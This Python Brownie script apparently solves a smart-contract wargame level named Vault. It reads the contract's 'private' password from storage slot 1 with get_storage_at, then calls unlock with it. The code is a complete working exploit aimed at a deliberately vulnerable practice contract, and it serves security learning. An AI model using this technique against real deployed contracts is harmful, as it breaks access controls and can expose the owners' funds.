from brownie import Vault, network, config, Contract
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():

    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        vault = Vault.deploy(b"A very strong secret password :)", {"from": account})

    else:

        web3 = Web3(
            Web3.HTTPProvider(config["networks"][network.show_active()]["infura"])
        )

        vault = Contract.from_abi(
            Vault._name,
            config["networks"][network.show_active()]["vault"],
            Vault.abi,
        )

    password = web3.eth.get_storage_at(str(vault), 1)

    vault.unlock(password, {"from": account}).wait(1)

    print(f"Vault is {'locked' if vault.locked() else 'unlocked'}")


def main():
    attack()
